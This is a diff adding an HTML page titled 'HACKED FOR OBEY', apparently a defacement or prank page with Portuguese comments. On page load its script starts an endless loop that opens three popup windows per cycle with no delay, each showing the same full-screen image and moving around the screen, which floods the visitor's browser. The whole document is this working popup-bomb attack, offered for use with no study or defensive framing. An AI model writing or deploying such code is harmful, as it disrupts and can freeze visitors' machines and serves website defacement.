@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HACKED FOR OBEY</title>
+</head>
+<body style="margin:0; overflow:hidden; background:black;">
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnkSSdPd9gij3dCxVYt8ol0vqNUM_ZYeHAdg&s"
+     style="width:100%; height:100%; object-fit:cover;">
+
+<script>
+let rodando = true;
+let janelas = [];
+
+// abre janela que se mexe
+function criarJanela(x, y) {
+    let w = window.open("", "", `width=180,height=180,left=${x},top=${y}`);
+
+    if (w) {
+        w.document.write(`
+            <body style="margin:0; overflow:hidden; background:black;">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnkSSdPd9gij3dCxVYt8ol0vqNUM_ZYeHAdg&s"
+                style="width:100%; height:100%;">
+            </body>
+        `);
+
+        // movimento
+        let dx = (Math.random() * 10) - 5;
+        let dy = (Math.random() * 10) - 5;
+
+        let interval = setInterval(() => {
+            try {
+                let nx = w.screenX + dx;
+                let ny = w.screenY + dy;
+
+                // bate na borda e volta
+                if (nx < 0 || nx > screen.width - 200) dx *= -1;
+                if (ny < 0 || ny > screen.height - 200) dy *= -1;
+
+                w.moveTo(nx, ny);
+            } catch (e) {
+                clearInterval(interval);
+            }
+        }, 50);
+
+        janelas.push(w);
+    }
+}
+
+// spam rápido controlado
+function spam() {
+    if (!rodando) return;
+
+    for (let i = 0; i < 3; i++) { // quantidade por ciclo
+        let x = Math.random() * (screen.width - 200);
+        let y = Math.random() * (screen.height - 200);
+        criarJanela(x, y);
+    }
+
+    setTimeout(spam, 0.0); // velocidade (menor = mais rápido)
+}
+
+// começa automático (pode ser bloqueado por navegador)
+window.onload = () => {
+    spam();
+};
+
+// para tudo ao sair
+window.onbeforeunload = () => {
+    rodando = false;
+};
+</script>
+
+</body>
+</html>
